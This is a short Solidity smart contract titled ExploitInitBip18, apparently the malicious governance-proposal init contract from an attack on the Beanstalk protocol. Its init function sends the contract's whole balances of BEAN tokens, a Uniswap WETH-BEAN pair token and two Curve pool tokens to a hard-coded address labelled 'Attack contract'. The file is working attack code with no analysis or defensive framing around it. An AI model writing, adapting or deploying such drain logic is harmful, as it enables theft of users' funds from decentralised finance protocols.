// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IBean.sol";
import "../interfaces/IUniswapV2/IUniswapV2Pair.sol";

contract ExploitInitBip18 {
    address private constant attackContract = 0x79224bC0bf70EC34F0ef56ed8251619499a59dEf; // Attack contract address

    IERC20 private constant BEAN = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db); // BEAN token address

    IERC20 private constant UNISWAP_WETH_BEAN = IERC20(0x87898263B6C5BABe34b4ec53F22d98430b91e371); // WETH_BEAN Uniswap v2 pair address
    IERC20 private constant BEAN_3CRV_POOL = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD); // BEAN3CRV-f Curve address
    IERC20 private constant BEAN_LUSD_POOL = IERC20(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D); // BEANLUSD-f Curve address

    function init() external {
        require(
            BEAN.transfer(
                attackContract,
                BEAN.balanceOf(address(this))
            )
        );

        require(
            UNISWAP_WETH_BEAN.transfer(
                attackContract,
                UNISWAP_WETH_BEAN.balanceOf(address(this))
            )
        );

        require(
            BEAN_3CRV_POOL.transfer(
                attackContract,
                BEAN_3CRV_POOL.balanceOf(address(this))
            )
        );

        require(
            BEAN_LUSD_POOL.transfer(
                attackContract,
                BEAN_LUSD_POOL.balanceOf(address(this))
            )
        );
    }
}
